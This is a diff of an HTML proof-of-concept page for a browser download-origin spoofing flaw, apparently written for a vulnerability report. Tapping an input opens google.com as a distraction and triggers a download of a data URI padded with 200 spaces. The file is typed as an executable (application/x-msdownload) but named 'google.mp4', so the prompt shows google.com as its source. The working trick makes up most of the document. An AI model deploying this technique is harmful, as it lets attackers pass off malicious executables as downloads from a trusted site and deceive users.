@@ -3,57 +3,32 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Download Origin Spoof - Original POC</title>
+  <title>Download Origin Spoof POC</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #fff;
-      margin: 0;
-      padding: 40px 20px;
-      text-align: center;
-    }
+    body { font-family: Arial, sans-serif; background: #fff; padding: 40px 20px; text-align: center; }
     h2 { color: #333; margin-bottom: 20px; }
     input {
-      padding: 16px 24px;
-      font-size: 18px;
-      border: 2px solid #4285f4;
-      border-radius: 8px;
-      width: 280px;
-      text-align: center;
-      cursor: pointer;
-      outline: none;
+      padding: 16px 24px; font-size: 18px; border: 2px solid #4285f4;
+      border-radius: 8px; width: 280px; text-align: center; cursor: pointer; outline: none;
     }
-    input:focus { border-color: #ea4335; box-shadow: 0 0 0 3px rgba(234,67,53,.2); }
-    .note {
-      margin-top: 20px;
-      color: #666;
-      font-size: 12px;
-    }
+    .note { margin-top: 20px; color: #666; font-size: 12px; }
   </style>
 </head>
 <body>
   <h2>POC - Download Origin Spoof via Data URI</h2>
-  <p style="color:#666;font-size:14px;">Tap the input box below</p>
   <input type="text" id="triggerInput" placeholder="Tap here..." readonly>
-
   <p class="note">
-    After tapping, observe the <strong>download prompt origin</strong>.<br>
-    It shows <code>data:https://google.com</code> instead of the actual page origin.
+    Tap input → opens Google → download prompt shows <b>google.com</b> as origin
   </p>
 
   <script>
     document.getElementById('triggerInput').addEventListener('click', function() {
-      // Request fullscreen to hide real URL bar
-      setTimeout(function() {
-        openWin();
-      }, 500);
-
-      // Open legitimate page in new tab as distraction
+      setTimeout(function() { openWin(); }, 500);
       window.open('https://www.google.com', '_blank');
-    }, { once: false });
+    });
 
     function Puf(uri, name) {
-      const link = document.createElement("a");
+      var link = document.createElement("a");
       link.href = uri;
       link.download = name;
       document.body.appendChild(link);
@@ -63,7 +38,7 @@
 
     function openWin() {
       Puf(
-        "data:https://google.com/                                                                                                                                                                                                                       application/x-msdownload;base64,ZXN0dGVzdHRlc3R0ZXN0",
+        "data:https://google.com/" + " ".repeat(200) + "application/x-msdownload;base64,ZXN0dGVzdHRlc3R0ZXN0",
         "google.mp4"
       );
     }
